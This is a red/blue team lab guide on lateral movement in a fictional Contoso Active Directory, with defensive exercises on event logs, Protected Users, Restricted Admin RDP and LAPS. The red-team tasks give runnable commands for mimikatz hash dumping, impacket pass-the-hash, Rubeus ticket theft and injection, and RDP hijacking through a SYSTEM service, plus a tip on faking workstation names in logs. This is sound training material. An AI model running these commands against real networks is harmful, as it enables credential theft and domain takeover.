![image](.\IMG\MSCyberCoursesResized.png)

# Threats targeting the hybrid & cloud identity platform

## Overview

Contoso is a big name and cannot risk being on the front page of all newspapers because of those stupid ransomware attacks that could have been easily prevented.
Thus, they have decided to create a strong security team. The two new employees <font style="color:red;">**Miss Red**</font> and <font style="color:blue;">**Mister Blue**</font> to respectively take care of the Red and Blue team.
The objective for Miss Red will be to test and detect vulnerable configuration and uncover unsecure practices. The objective for Mister Blue will be to implement proper monitoring and defense mitigations against the attacks detected by the red team. 



===
# Lateral movement 
All exercises and tasks must be done in the defined order. They build on each other, if you skip a step, you will no longer be able to continue.

In this lab, your role will alternate between a member of the <font style="color:red;">**Red Team**</font> and a member of the <font style="color:blue;">**Blue Team**</font>. This way you will be able to see what an attacker sees as well as how to configure the environment to mitigate the attacks.

This lab will focus on common lateral movement techniques against on-premises accounts and how to make it harder for attackers. 

You mainly use two accounts:

|Red Team|Blue Team|
|:--------:|:--------:|
|Miss Red|Mister Blue|
|CONTOSO\red|CONTOSO\blue|

<font style="color:red;">**CONTOSO\red**</font> is only a user of **CONTOSO\Domain Users** and does not have any privilege on the domain. However, she is a member of the local **Administrators** group on **CLI01**.

<font style="color:blue;">**CONTOSO\blue**</font> is a domain privileged account member of the **Domain Admins** group.

=====


## Exercise 1 - Identify an ideal path
We are still working on the same contoso.com environment composed of the following machines:
- **DC01** a domain controller for contoso.com running Windows Server 2016 in the HQ Active Directory site
- **DC02** a domain controller for contoso.com running Windows Server 2022 in the Beijin Active Directory site
- **SRV01** a domain joined server member of the contoso.com domain running Windows Server 2022
- **CLI01** a domain joined client member of the contoso.com domain running Windows 11

In this exercise, <font style="color:red;">**Miss Red**</font> will try to find the best way to move lateraly using the information about the configuration and credentials she gathered in the previous labs. 

### Task 1 - Prepare the environment 
In this lab series, <font style="color:red;">**Miss Red**</font> will steal the credentials of an privileged connected account on **SRV01**. We first need to simulate than a privileged account connected to **SRV01**. So, let's do that. 

1. [] Log on to **@lab.VirtualMachine(DC02).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\v.fergusson.adm` |
    | Password | Please type the password |
    
1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window type `mstsc.exe` and click **OK**.

1. [] In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**. 

**⚠️ Leave the session open!**

This is the session from which <font style="color:red;">**Miss Red**</font> will steal credentials. If you do not execute this path, you will not be able to continue the exercises. 

### Task 2 - Identify a path to SRV01

Hello <font style="color:red;">**Miss Red**</font>. From your previous recons, you know that SRV01 is a yummy target from which domain admins do their work. You also found the password of a couple of accounts. Amongst one of them was **Pierre**. Let's use BloodHound to find a good paths from Pierre to domain admins using **SRV01**.

1. [] Log on to **@lab.VirtualMachine(CLI01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |
    
1. [] Open a **File Explorer** window and natigate to `C:\Tools\BloodHound`.

1. [] Double click on `BloodHound.exe` and log in using these credentials
    |||
    |:--------|:--------|
    | Neo4j Username | `neo4j` |
    | Neo4jPassword | `NeverTrustAny1!` |
  
1. [] In the **Search for a node field** on the top left type and select the following account: `PIERRE@CONTOSO.COM`. Then click the small road icon ![image](.\IMG\BHROAD.png) and in the **Target Node** field, type and select `SRV01.CONTOSO.COM`. The result should be the following graph:
![image](.\IMG\BHPATH2.png)
Let's decompose one of these paths:
![image](.\IMG\BHPATH3.png)
**Pierre** is a member of the **Account Operators** group. As such, **Pierre** can reset the password of **Connie.Flores** who is a member of the local administrator of **SRV01**.

1. [] In the graph, click on **CONNIE.FLORES@CONTSO.COM** account and explore the **Node Info** tab. 
    
    📝 When was the last time her password was changed?

    📝 When was the last time Connie logged in with her account? 

    📝 Is her account still enabled?

    This account seems to be stale. It was probably forgotten... It happens... Very often... Let's use our knowledge of **Pierre**'s password to reset her password and then use her account to connect to **SRV01**.

1. [] Right click on the Start menu ![image](.\IMG\11menu.png) and click on **Windows Terminal (Admin)**.

1. [] In the **Windows Terminal** window, run the following: `runas /user:pierre@contoso.com cmd.exe` and use the following password `Passw0rdPassw0rd`.

    >[!help] The password will not show in the prompt. Once you have clicked on the ![image](.\IMG\ntw2poa5.jpg) in front of the password, hit the Enter key to validate the input. 

1. [] You should see a new command prompt window with the title **cmd.exe (running as pierre@contoso.com)**. In this window, let's reset Connie's password by running the following command `net user CONNIE.FLORES  NeverTrustAny1! /domain`

1. [] Close the command prompt.

You now control Connie's account.

===

## Exercise 2 - Perform a pass-the-hash attack

Well done <font style="color:red;">**Miss Red**</font>, now that you control **Connie**, a domain user member of the local administrators of **SRV01**, you own **SRV01** and all the accounts connected to it.

### Task 1 - Extract credentials from SRV01

Let's check if there is something yummy to steal (well, we know there is because we connected with Vickie's admin account to SRV01 at the beginning of this lab).

1. [] We are still on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] You should still have a **Windows Terminal** window open. If that's not the case, open one by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**.

1. [] In the **Windows Terminal** window, run the following: `runas /user:connie.flores@contoso.com cmd.exe` and use the following password `NeverTrustAny1!`.

    >[!help] The password will not show in the prompt. Once you have clicked on the ![image](.\IMG\ntw2poa5.jpg) in front of the password, hit the Enter key to validate the input. 

1. [] To avoid confusion, you are going to change the color of that new prompt. Make sure you have the cmd.exe (running as connie.flores@contoso.com) open and in focus, then run `color 4F & title Connie CMD`
    This is what your window with Connie.Flores should look like: ![image](.\IMG\REDC2.png)
    Note that not only we changed the color, but we also have given the window a new title **Connie CMD**.

    We are going to run credential theft tools on **SRV01**. 

1. [] In from the **Connie CMD** window, run the following command `cd \Tools\PStools` then run `psexec.exe \\SRV01 cmd.exe -accepteula`

    ⌚ The might take a little while (about30 seconds).

    Note that the title of the console is now **\\\SRV01: cmd.exe**

1. [] Run the following command `hostname`. It will tell you to which system you are connected.

    Let's list the connected users.

1. [] Run the following command `query user`.

    📝 What is the SESSIONNAME of Vickie Fergusson's admin account?

    Let's extract Vickie's NT Hash.

1. [] Still from the **\\\SRV01: cmd.exe** window, run the following command `cd \Tools\mimikatz` then run `mimikatz.exe`.

1. [] In the **mimikatz #** prompt, take the seDebugPrivilege to be able to read the memory: `privilege::debug` then run the following command to extract the NT hashes from the memory: `sekurlsa::msv`. Scroll up until the see the following:
![image](.\IMG\MIMI1.png)
Vickey's hash is displayed in the **NTLM** proprety.

    📝 What is the NT Hash of Vickie Fergusson's admin account?

Congrats <font style="color:red;">**Miss Red**</font>! You got your hands on Vickie's admin account. And Vickie is a domain admin... It smells very good 🌷

### Task 2 - Pass the hash of Vickie while connecting to a domain controller

Congratulation on getting a domain admin's hash <font style="color:red;">**Miss Red**</font>. Now it's time to use it.

1. [] We are still on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |
    
1. [] Switch to your **Windows Terminal** console. If you closed it, open a new one by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**.

1. [] In the **Windows Terminal** window, run the following `cd \Tools\Scripts`. Then run the following command: `python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.11 cmd.exe`
This opens a command prompt on 192.168.1.11 (aka **DC01**) and we used to hash of Vickie during the logon process.

1. [] To confirm we are on **DC01**, run `hostname` and to see who we are on this system, run `whoami`.
You should have these results: ![image](.\IMG\PSEXECPY.png)

    Congratulation <font style="color:red;">**Miss Red**</font> you are SYSTEM on a domain controller without knowing the password of an admin, but by knowing (and using) only the hash. **You passed the hash.** Let's tell <font style="color:blue;">**Mister Blue**</font> about it.

1. [] In the same prompt run `exit` to exit the PsExec session.
![image](.\IMG\dptqeqnc.png)

### Task 3 - Check the traces on the domain controller

Welcome back <font style="color:blue;">**Mister Blue**</font>. It seems that <font style="color:red;">**Miss Red**</font> owns an admin account and is SYSTEM on your favorite domain controller. The one you swear to protect when you where hired... Let's see what we can see of that recent pass-the-hash.


1. [] Log on to **@lab.VirtualMachine(DC01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Event Viewer**.

1. [] In the **Event Viewer** window, navigate to **Event Viewer (Local)** > **Windows Logs** > **Security**.

1. [] On the **Actions** pane, click again on **Filter Current Log...**. In the **Filter Current Log** window, select the **XML** tab and click the **Edit query manually** check box. Acknowledge the pop-up by clicking **Yes**.

1. [] Select the XML filter in the window and delete it.

1. [] Type the following filter instead:
    `
    <QueryList>
    <Query Id="0" Path="Security">
    <Select Path="Security">
    Event[
    System[
    (EventID=4624) or (EventID=4776) 
    ] and
    EventData[
    Data[@Name="TargetUserName"]="v.fergusson.adm"
    ]
    ]
    </Select>
    </Query>
    </QueryList>
    `
    And click **OK**.

1. [] Double click on the latest successful event **4776**. It should look like this: ![image](.\IMG\4776PY.png)

    📝 What does error code 0x0 means in this context?

    You notice that the Source Workstation is empty.

    <details><summary>❓ Why is the Source Workstation property empty in the event 4776? **Click here to see the answer**.</summary>
    Because it is set at the discretion of the client and here, the **psexec.py** just doesn't set it.
    Well to be precise the **impacket** module sets it to blank in the **ntlm.py** file if no value was passed (and **psexec.py** doesn't pass any). If you want to set an arbitrary value instead, like the name of an existing machine to mess with the security analyst, you can update the line **306** of `C:\Program Files\Python310\Lib\site-packages\impacket\ntlm.py`
    </details> 

1. [] Double click on the latest succesful event **4624**. You can see the actual IP address of **CLI01** in that entry.

    📝 What is the Authentication Package in the event 4624?

You can see why the **Pass-The-Hash** type of attack is tough to detect just looking at the logs. It just look like a legit connection. You need to make this attack less easy...

===

## Exercise 3 - Reduce NT Hash exposure

Alright <font style="color:blue;">**Mister Blue**</font>. As soon as SRV01 was owned, all the accounts caching their creds in it were at risk. How can we reduce that NT Hash exposure on a system.

### Task 1 - Leverage the Protected Users group

To take full advantage of the Protected Users group protection, the domain functional level needs to be at least Windows Server 2012 R2. Let's see if that's the case for us.

1. [] Log on to **@lab.VirtualMachine(DC01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `dsa.msc` then click **OK**.

1. [] In the **Active Directory Users and Computers** console, right click on the domain **contoso.com** and click **Properties**.
    You should see that the current level is 2008 R2. Not great. Let's change that. Click **OK** to close the domain properties window. 

1. [] Still in the **Active Directory Users and Computers** console, right click on the domain **contoso.com** and click **Raise domain functional level...**. From the drop-down menu, select **Windows Server 2016** and click **Raise**. A pop-up asks you to confirm the operation, click **OK**. And **OK** again in the next confirmation pop-up.

1. [] Now browse the domain, click on the organizational unit **_Admins**, right click on the **Vickie Fergusson Adm** account click **All Tasks** and then **Add to a group...**.

1. [] In the **Select Groups** window, type `Protected Users`, then click **Check Names** and click **OK**. Click **OK** in the confirmation pop-up.

    This will block the usage of NTLM on this account. That's okay because she is an admin. Blocking NTLM on a regular account is very tricky as you will need to understand all possible dependencies with the applications and systems used by a user.
    Let's also enable some logs for visibility.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Event Viewer**.

1. [] In the Event Viewer window, navigate to  **Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **Authentication**.

1. [] Right click on the **ProtectedUserFailures-DomainController** and select **Enable Log**. Do the same things for the **ProtectedUserSuccesses-DomainController**. Now we will see the failures and successes for the members of the **Protected Users** group on a separate event log.

Let's ask <font style="color:red;">**Miss Red**</font> to pass-the-hash again.

### Task 2 - Try to pass-the-hash again

Hello back <font style="color:red;">**Miss Red**</font>. It seems that things have changed, and that Vickie's account might not be usable with NTLM. Let's see if that's really the case.

1. [] Let's connect on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] You should still have a **Windows Terminal** window opened. If that's not the case, open one by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**.

1. [] In the **Windows Terminal** window, run the following `cd \Tools\Scripts`. Then run the following command: `python.exe psexec.py -hashes :e9cea451b61bd792681893d48f9683b9 CONTOSO/v.fergusson.adm@192.168.1.21 cmd.exe`
This time we are trying to open a command prompt on 192.168.1.21 (aka **SRV01**) just for a change.

    📝 What is the SessionError code?
    
Knowing the hash of Vickie's account is not enough to try to impersonate her. At least not by using NTML.

### Task 3 - Check the traces

Good job <font style="color:blue;">**Mister Blue**</font>. It seems the attack now fails. Let's check the traces it left on the domain controller.

1. [] Log on to **@lab.VirtualMachine(DC01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] If you do not have an **Event Viewer** window, right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Event Viewer**.

1. [] In the **Event Viewer** window, navigate to **Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **Authentication** > **ProtectedUserFailures-DomainController**. You should see the following event:
![image](.\IMG\EVT100.png)

    📝 What is the Event ID?

    You see the **Device Name** is **(NULL)**. It also means that if you check the event **4776** on the **Security** logs you would also see an empty **User Workstation** property. Let's check if we can identify the server against which the hash was tried.

1. [] In the **Event Viewer** window, navigate to **Event Viewer (Local)** > **Applications and Services Logs** > **Microsoft** > **Windows** > **NTLM** > **Operational**. You should see the following event **8004**:   
![image](.\IMG\NTLM8004-2.png)

Well that's good. You made the usage of that NT Hash a bit less relevant... But it would have been nice that this hash not be stored in the memory in the first place. Let's see how to achieve that.

### Task 4 - Connect to a system when you are a Protected Users member

Let's see what happens if Vickies "RDPes" to server while being a member of the Protected Users group.

Let's kill all active session on **SRV01**, we are going to reboot the server to make it easier.

1. [] Connect on to **@lab.VirtualMachine(SRV01).SelectLink** using the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png), click on **Shut down and sign out** then click **Restart**. 

1. [] In the confirmation popup, select **Other (Unplanned)** and click **Continue**.

    If you get a confirmation pop-up, click **Restart anyway**.

1. [] Log on to **@lab.VirtualMachine(DC02).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\v.fergusson.adm` |
    | Password | Please type the password |

1. [] At this point your Remote Desktop session establised with **SRV01** should have dropped. We are going to establish another one.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window type `mstsc.exe` and click **OK**.

1. [] In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**. 

1. [] In the **srv01** session window, right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Windows PowerShell (Admin)**.

1. [] In **Windows PowerShell** prompt, run the following command `cd \Tools\mimikatz` then run `mimikatz.exe`.

1. [] In the **mimikatz #** prompt, take the seDebugPrivilege to be able to read the memory: `privilege::debug` then run the following command to extract the NT hashes from the memory: `sekurlsa::msv`. Scroll all the way up the output you should see the following:
![image](.\IMG\MIMI3.png)

    You can see that there is no NTLM property available for Vickie's session.

1. [] Close the **mimikatz 2.2.0 x64 (oe.eo)** window.

1. [] Close the RDP session open (without signing out) by clicking on the X on the blue ribbon on the top of the screen: 
![image](.\IMG\xqx8k97k.png)

1. [] Sign-out Vickie from the session by right clicking on the Start menu ![image](.\IMG\2022menu.png), clicking **Shut down or sign out** and select **Sign out**.

===

## Exercise 4 - Perform a pass-the-ticket attack

In this exercise <font style="color:red;">**Miss Red**</font> will try to steal the TGT of a privileged account to impersonate his or her on other system without knowing her password.

### Task 1 - Prepare the environment 
You will steal Katrina's ticket on **SRV01**. We first need make sure she is connected to **SRV01**. So let's do that. 

1. [] Log on to **@lab.VirtualMachine(DC02).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |
    
    <font style="color:red;">**⚠️ You need to connect with Katrina's account, not Vickie's.**</font>

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window type `mstsc.exe` and click **OK**.

1. [] In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**. 

**⚠️ Leave the session open!**

### Task 2 - Export tickets out of SRV01

Let's check if there is something yummy to steal (well, we know there is because we made sure Katrina's admin account is connected to SRV01).

1. [] We are still on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |
    

1. [] You should still have a **Connie CMD** red prompt open. If that's not the case, we are going to get back one by right clicking on the Start menu ![image](.\IMG\11menu.png) and then clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:connie.flores@contoso.com cmd.exe` and use the following password `NeverTrustAny1!`. Then run `color 4F & title Connie CMD` and `cd \Tools\PStools`.

1. [] In **Connie CMD** red prompt window, run `psexec.exe \\SRV01 cmd.exe -accepteula`

    ⌚ The might take a little while (about a minute).

1. [] If this is successful, the title of the window will be **\\\SRV01: cmd.exe**. Run the following command `cd \Tools\Ghostpack` then run `rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt`

1. [] Copy the base64 output into your clipboard.
![image](.\IMG\bq7frbd6.png)

1. [] Right click on the Start menu ![image](.\IMG\11menu.png) and click **Run**. In the **Run** window, type `notepad.exe` and click **OK**.

1. [] In the **Notepad** window, paste the base64 value and save the file. Click **File** then **Save as** and in the **File name** field type `C:\Users\Public\tgt.txt` and click **Save**.

1. [] Exit the PSExec session by also running `exit`. It will look like this:
![image](.\IMG\EXIT1.png)
Then after few seconds you get the prompt back (if it seems to take to long, hit **[Ctrl] + C** to speed up the termination).

### Task 3 - Inject stolen tickets into memory

<!--
1. [] Open a **File Explorer** window and navigate to `C:\Users\Public`. Locate one of the ticket with the string krbtgt in it (you should have two). Right click on one of them and click on the rename icon ![image](.\IMG\RENICO.png). Rename it `tgt.kirbi`.
-->
1. [] Let's put the base64 ticket into your clipboard. In the **Windows Terminal** window, run `(Get-Content C:\Users\Public\tgt.txt) -join "" -replace " " | clip`.

    >[!knowledge] **clip** is a command line tool that take the output of a command and save it to the clipboard.

1. [] In the **Windows Terminal** window, run `klist`. It should return a bunch of Kerberos ticket. The one for your current session. Note that all of them are for the **Client:** **red @ CONTOSO.COM**. Those tickets were obtains thanks to our TGT. You can see the TGT by running `klist tgt`. It should look like this:
![image](.\IMG\TGT1.png)

1. [] In the same console, try to browse the C$ share of a domain controller, first run `cmd` and then run `dir \\DC01\C$`. You should get this error message:
![image](.\IMG\PTT0.png)

1. [] Change the active directory by running `cd \Tools\Ghostpack` and then type but do not execute `rubeus.exe ptt /ticket:` then before hitting Enter, make sure you place your cursor on the terminal and do a right click anywhere in the console. This should paste the content of your clipboard in the console. Then hit **Enter**.
    It should look like this:
    ![image](.\IMG\v2nlpjjb.png)


1. [] Still in the **Windows Terminal** window, run `klist`. All your tickets are gone and being replaced by the one you've stolen from SRV01.

1. [] In the same console, try again to browse the C$ share of a domain controller by running `dir \\DC01\C$`.

<!--
    ⚠️ At this stage it is possible you get the following error message:
    ![image](.\IMG\ERRORW.png)
    If that's the case, lock the current session by running `Rundll32.exe user32.dll,LockWorkStation`
    Then unlock the session using the password `NeverTrustAny1!`
    And then try again to run `dir \\DC01\C$`.
-->

1. [] List all tickets by running `klist`. You now have three tickets:
![image](.\IMG\qshxoyi5.png)

    📝 What is the Session Key Type of the cifs/DC01 ticket?

    <details><summary>❓ Does the Protected Users group protect Kerberos material like it does for NTLM? **Click here to see the answer**.</summary>
    When a member of the Protected Users group signs into a Windows Server 2012 R2 or higher, the following protections specific to Kerberos apply:
    - Kerberos long-term keys. The keys from Kerberos initial TGT requests are typically cached so the authentication requests are not interrupted. For accounts in this group, Kerberos protocol verifies authentication at each request.
    - Cannot use DES or RC4 encryption types in Kerberos pre-authentication.
    - Cannot be delegated using either unconstrained or constrained delegation.
    - Cannot renew the Kerberos TGTs beyond the initial four-hour lifetime.
    More information here 🔗 [Protected Users Security Group](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
    </details> 

===

## Exercise 5 - Hijack a Remote Desktop session

In this exercise <font style="color:red;">**Miss Red**</font> will try steal a Remote Desktop Session without using any malicious tools, just by living off the land.

### Task 1 - Prepare the environment 
In this lab series, <font style="color:red;">**Miss Red**</font> will hijack an RDP session of a privileged connected account on **SRV01**. We first need to simulate than a privileged account connected to **SRV01**. So, let's do that. 

Note that if you just finised the **Exercise 4**, you might still have an RDP session open on **SRV01** with **Kartina**'s account. If that's the case you can slip this task.

1. [] Log on to **@lab.VirtualMachine(DC02).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |
    
1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window type `mstsc.exe` and click **OK**.

1. [] In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**. 

**⚠️ Leave the session open!**

### Task 2 - Take over an RDP session

Hello <font style="color:red;">**Miss Red**</font>. You know the password for **Connie**. Let's use that to connect **SRV01** and take over whatever sessions we have there.

1. [] Log on to **@lab.VirtualMachine(SRV01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\connie.flores` |
    | Password | Please type the password |
    
    At this point it is possible you see the following message:
    ![image](.\IMG\MULTIRDP2.png)
    Check the box **Force disconnect of this user** and pick an account (ideally **CONTOSO\v.fergusson.adm**).

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Windows PowerShell (Admin)**.
    
1. [] Let's list the current sessions, switch to a Command Prompt session by running `cmd` then run the following `query user`.

    Make a note of the session ID you want to take over. Let's consider the following output:
    ![image](.\IMG\RDP3.png)
    
    Enter the session ID that you see for Katrina:  @lab.TextBox(KatrinaID)

    Also note that we are connected to the console session with Connie.
    
    To take over Katrina's session you need to run the following command as SYSTEM **tscon @lab.Variable(KatrinaID) /dest:console**

    📝 In which folder the executable tscon.exe is located?

1. [] Still in the same prompt, run the following command  `sc create Sorry binpath= "cmd.exe /k tscon @lab.Variable(KatrinaID) /dest:console"`

    This created a service called Sorry. Service's default security context is **NT AUTHORITY\SYSTEM** As soon as you start this service it will execute the command we want as SYSTEM.

    📝 Is sc.exe provided by default in Windows?

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.
 
1. [] In the **Run** window, type `services.msc` and click **OK**.

1. [] In the **Services** window, right click on the service called **Sorry** and select **Start**.

    You are now in Kartina's session! It was THAT easy 😎

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Windows PowerShell (Admin)**.

1. [] In the console type the following `cmd` and then `whoami`. You should have confirmation you are in Katrina's session.

1. [] In the same console type the following command: `dir \\DC01\C$`. Since Katrina's in a domain admin, you should be able to browse the C$ share of the domain controller.

    Let's restart SRV01 and kick everyone out of it.

1. [] Close all opened windows.

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Shut down or sign out** and select **Restart**. In the confirmation pop-up click **Continue** and then click on **Restart anyway**.

At this point **SRV01** should be started but no one should be connected to it.

===

## Exercise 6 - Secure Remote Desktop sessions

In this exercise <font style="color:blue;">**Mister Blue**</font> will enable a more secure way to do RDP to address most of the issues that caching credentials raise.

### Task 1 - Enable the Restricted Admin mode

The RDP Restricted Mode allows you to connect to a server using RDP without caching your credentials on the target server. Therefore, there would be nothing to steal! But that's not enabled by default, so let's enable it. And let's do that everywhere by setting up a group policy for it. 

1. [] Log on to **@lab.VirtualMachine(DC01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `gpmc.msc` and click **OK**. 

1. [] In the **Group Policy Management** window, navigate to **Group Policy Management** > **Forest: contoso.com** > **Domain** > **contoso.com**. Right click on **Default Domain Policy** and click **Edit**.

1. [] In the **Group Policy Management Editor** window, navigate **Default Domain Policy [DC01.contoso.com]** > **Computer Configuration** > **Preferences ** > **Windows Settings**. Right click on **Registry** and select New then **Registry item**.

1. [] In the **New Registry Properties** and in the **General** tab, in the **Hive** menu make sure you **HKEY_LOCAL_MACHINE** is selected. In the **Value type** drop down menu, pick **REG_DWORD**. In the **Key Path** type `System\CurrentControlSet\Control\Lsa`, and in the **Value name** `DisableRestrictedAdmin` and in Value data type `0`.

    🤪 We disabled the "disable" so we enabled the feature... I know, it's quite the mental gymnastics. 

    Make sure it looks like this:
    ![image](.\IMG\RESTRICTED3.png)
    And click **OK**.

1. [] Close the **Group Policy Management Editor** window. 

    Group policies refresh every 90 minutes, with a randomized offset of plus or minus 30 minutes. So, either you wait and grab a coffee ☕ or better, we'll force the refresh of GPO on **SRV01**.

1. [] Log on to **@lab.VirtualMachine(SRV01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `cmd /k gpupdate` and click **OK**.

    <details><summary>❓ Why the /k? **Click here to see the answer**.</summary>
    The **/k** parameter of **cmd.exe** allows you to leave the prompt open once the following command is executed. Try to run `cmd gpudapte` or just `gpudapte` to see the difference. 
    </details> 

1. [] In the command prompt, type the following `logoff`. That will sign off the user.

### Task 2 - Connect using the RDP RestrictedAdmin mode

Katrina will connect again to **SRV01** but this time using the RDP restricted admin mode.

1. [] Log on to **@lab.VirtualMachine(DC02).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |
    
1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window type `mstsc.exe /restrictedadmin` and click **OK**.

1. [] In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**. 

**⚠️ Leave the session open!**

If you receive the following message:
![image](.\IMG\RDP_ERROR.png)
The policy has not applied yet. Go back to the previous task and make sure you have been through the last two steps (connecting to **SRV01** and refreshing policies).

Ping <font style="color:red;">**Miss Red**</font> and tell her to steal Katrina's 

### Task 3 - Try to steal credentials

Welcome back <font style="color:red;">**Miss Red**</font>. Let's see what we can extract from **SRV01**'s memory.

1. [] Log on **@lab.VirtualMachine(CLI01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |
    

1. [] You should still have a **Connie CMD** red prompt open. If that's not the case, we are going to get back one by by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:connie.flores@contoso.com cmd.exe` and use the following password `NeverTrustAny1!`. Then run `color 4F & title Connie CMD` and `cd \Tools\PStools`.

1. [] In **Connie CMD** red prompt window, run `psexec.exe \\SRV01 cmd.exe -accepteula`

    ⌚ The might take a little while (about30 seconds).

1. [] If this is successful, the title of the window will be **\\\SRV01: cmd.exe**. Run the following command `cd \Tools\mimikatz` then run `mimikatz.exe`.

1. [] In the **mimikatz #** prompt, take the seDebugPrivilege to be able to read the memory: `privilege::debug` then run the following command to extract the NT hashes from the memory: `sekurlsa::logonPasswords`.
    Scroll all the way up the output. You should see the following
    ![image](.\IMG\RESTRICTEDMIMI.png)

    📝 What is the Username stored in the NTLM section (msv)?

    With the **Restricted Admin** mode, Katrina's credentials are not stored in LSASS. Instead, it is the computer account's credentials stored where Katrina's credential should be.
    It means that Katrina cannot connect from **SRV01** to another machine as that connection would use the computer account.

1. [] Let's clean up a bit. Restart **@lab.VirtualMachine(CLI01).SelectLink** by right clicking on the Start menu ![image](.\IMG\11menu.png), selecting **Shut down or sign out** and then **Restart**. 

1. [] Log back on **@lab.VirtualMachine(DC02).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |

1. [] Restart **@lab.VirtualMachine(DC02).SelectLink** by right clicking on the Start menu ![image](.\IMG\2022menu.png) and clicking on **Shut down or sign out** and then **Restart**. 

===

## Exercise 7 - Secure the local administrator password [optional]

In this exercise <font style="color:blue;">**Mister Blue**</font> will deploy Local Administrator Password Solution. This solution will allow the domain joined machines to automatically change the password of the local administrator account (by default the default local administrator, with the objectSid finishing with -500) and store the data in the computer object in AD DS in a confidential attribute.

### Task 1 - Prepare the forest

1. [] Log on **@lab.VirtualMachine(DC01).SelectLink** with the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Run**.

1. [] In the **Run** window, type `dsa.msc` and click **OK**.

1. [] In the **Active Directory Users and Computers** right click on the domain **contoso.com** and click **Find...**. 

